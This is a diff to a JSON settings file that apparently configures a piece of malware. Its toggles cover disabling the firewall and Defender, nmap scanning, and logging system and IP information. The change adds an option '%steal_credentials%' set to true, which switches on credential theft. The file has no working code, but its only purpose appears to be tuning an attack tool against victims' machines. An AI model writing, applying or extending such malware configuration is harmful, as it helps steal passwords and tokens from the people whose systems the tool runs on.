@@ -3,6 +3,7 @@
     "%disable_firewall%": false,
     "%disable_defender%": false,
     "%nmap_scan%": true,
+    "%steal_credentials%": true,
     "%log_sysinfo%": true,
     "%log_ipinfo%": true
 }
